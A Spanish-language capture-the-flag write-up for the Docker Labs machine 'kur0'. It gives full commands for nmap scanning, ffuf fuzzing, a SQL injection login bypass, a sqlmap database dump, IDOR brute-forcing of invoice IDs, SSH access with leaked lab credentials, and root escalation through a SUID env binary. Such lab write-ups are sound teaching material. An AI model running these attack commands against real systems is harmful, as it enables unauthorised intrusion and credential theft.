
# Máquina Docker Labs: kur0

- **Autor:** kur0
    
- **Dificultad:** Fácil - Media
    
- **Fecha:** 22 de Junio, 2026
    

## 🛠️ Comandos Utilizados

- `ping -c 4 172.17.0.2`: Verifica la conectividad con el objetivo enviando 4 paquetes ICMP y ayuda a determinar el sistema operativo según el TTL.
    
- `sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn -oN scan 172.17.0.2`: Escanea los 65535 puertos de forma sigilosa (`-sS`), aplicando scripts básicos (`-sC`) y detección de versiones (`-sV`) a alta velocidad.
    
- `ffuf -w [wordlist] -u [url]`: Realiza fuzzing web iterativo para descubrir directorios ocultos (usando `-recursion`) o fuzzear parámetros numéricos y alfanuméricos en la URL para explotar el IDOR.
    
- `sqlmap -u [url] --data=[post] --cookie=[session] -p username --level=3 --risk=2 --dbms=mysql --dump --batch`: Automatiza la detección y explotación de la inyección SQL en el parámetro indicado para extraer la base de datos sin interactuar manualmente.
    
- `ssh duque@172.17.0.2`: Permite establecer una conexión segura por consola remota utilizando las credenciales comprometidas del usuario `duque`.
    
- `find / -perm -4000 -type f 2>/dev/null`: Busca archivos en todo el sistema que tengan el bit SUID activo (`-perm -4000`) y descarta los errores para listar binarios potencialmente explotables.
    
- `/usr/bin/env /bin/sh -p`: Ejecuta una shell manteniendo los privilegios del propietario del archivo (`-p`), lo que permite spawnear una consola como `root` gracias al bit SUID del binario `env`.
    

## 🎯 Flujo de Ataque (Killchain)

Fragmento de código

```
graph LR
    Ping --> Nmap --> ffuf --> Panel --> SQLi --> SQLMap --> Admin_Login --> IDOR --> SSH --> SUID_env --> Root
```

> **Resumen del flujo:** Ping $\rightarrow$ Nmap (SSH + HTTP) $\rightarrow$ ffuf $\rightarrow$ `/bills/panel.php` $\rightarrow$ SQLi (mario) $\rightarrow$ SQLMap (admin:admin123) $\rightarrow$ Login admin $\rightarrow$ IDOR (xyc724) $\rightarrow$ Credenciales duque $\rightarrow$ SSH $\rightarrow$ SUID env $\rightarrow$ root

## 🔍 Reconocimiento y Enumeración

### Escaneo de Red (Ping)

Primero tiré un ping para ver si la máquina estaba activa y adivinar el sistema operativo:

Bash

```
ping -c 4 172.17.0.2
```

**Resultado:**

Plaintext

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.070 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.055 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.051 ms
64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.061 ms
```

Como el TTL es 64, confirmo que es una máquina Linux.

### Escaneo de Puertos (Nmap)

Después pasé `nmap` para ver qué puertos estaban abiertos y qué versiones corrían:

Bash

```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn -oN scan 172.17.0.2
```

**Resultados destacados:**

- **Puerto 22/tcp:** SSH (OpenSSH 8.9p1 Ubuntu)
    
- **Puerto 80/tcp:** HTTP (Apache httpd 2.4.52)
    

### Enumeración Web

Como vi el puerto 80 abierto, usé `ffuf` para buscar directorios ocultos:

Bash

```
ffuf -w ~/Desktop/Lists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt -u http://172.17.0.2/FUZZ -recursion -e .php,.html -v -o ffufscan
```

> [!NOTE]
> 
> El flag `-recursion` me sirvió para que busque dentro de las carpetas que iba encontrando.

**Directorios encontrados:**

- `/intranet/`
    
- `/bills/`
    
- `/bills/index.php` (Acá había un login)
    
- `/bills/panel.php`
    

## ⚡ Explotación y Acceso Inicial

### SQL Injection

En el login de `/bills/index.php`, probé una inyección SQL básica en el usuario:

SQL

```
' OR 1=1-- -
```

Entró directo, pero me logueó como "mario". Mario es un usuario común y no tenía acceso al panel de admin.

### SQLMap

Para sacar más usuarios, intercepté la petición del login y se la pasé a `sqlmap`:

Bash

```
sqlmap -u "http://172.17.0.2/bills/" --data="username=*&passwor=fht" --cookie="PHPSESSID=dkoin5nnl92q4f6h5u3akmlpb0" -p username --level=3 --risk=2 --dbms=mysql --dump --batch
```

> [!TIP]
> 
> También podés guardar la petición de Burp Suite en un archivo de texto para omitir comandos repetitivos:
> 
> `sqlmap -r peticion.txt -p username --level=3 --risk=2 --dbms=mysql --dump --batch`

`sqlmap` encontró varias vulnerabilidades y me dumpeó la tabla de usuarios:

|**id**|**username**|**passwd**|
|---|---|---|
|1|mario|mario123|
|2|jesus|jesus2026|
|3|**admin**|**admin123**|

Acá conseguí las credenciales del admin: `admin:admin123`.

### IDOR

Me logueé como admin. Vi que en el panel, las facturas se cargaban con un ID en la URL tipo `?id=xya456`. Era siempre "xy", una letra y tres números.

Armé un bucle rápido en bash para probar todas las combinaciones (son 26.000) y usé `ffuf` para mandarlas, filtrando por el tamaño de la respuesta para ver cuál era distinta:

Bash

```
ffuf -w <(for l in {a..z}; do for n in {0..9}{0..9}{0..9}; do echo "$l$n"; done; done) -u "http://172.17.0.2/bills/panel.php?id=xyFUZZ" -H "Cookie: PHPSESSID=edptot42qkohno15r27g1jfqif" -mr "Detalle de Factura" -c -t 20 -fs 5906
```

> [!TIP]
> 
> También podés usar el archivo de Burp Suite, colocar la palabra `FUZZ` en la cabecera correspondiente y ahorrarte los flags `-u` y `-H`.

Me saltó el ID `c724` con un tamaño distinto al resto. Fui a `http://172.17.0.2/bills/panel.php?id=xyc724` y en el detalle decía:

- **USUARIO:** duque
    
- **PASSWORD:** duquelaje81029557!
    

### Acceso SSH

Con esas credenciales me conecté por SSH:

Bash

```
ssh duque@172.17.0.2
```

Y entré al servidor como el usuario duque.

## 🚀 Escalada de Privilegios

El usuario duque no podía usar `sudo`, así que busqué binarios con permisos SUID mal configurados:

Bash

```
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
```

Encontré este que me llamó la atención porque tenía propietario root:

Plaintext

```
-rwsr-xr-x 1 root root 43976 Jan 23 10:51 /usr/bin/env
```

Busqué en GTFOBins y vi que se podía usar `env` para escalar. Ejecuté esto agregando el flag `-p` para mantener los privilegios:

Bash

```
/usr/bin/env /bin/sh -p
```

Revisé mi usuario para confirmar:

Bash

```
id
# uid=1000(duque) gid=1000(duque) euid=0(root) groups=1000(duque)

whoami
# root
```

Ya era root, máquina completada.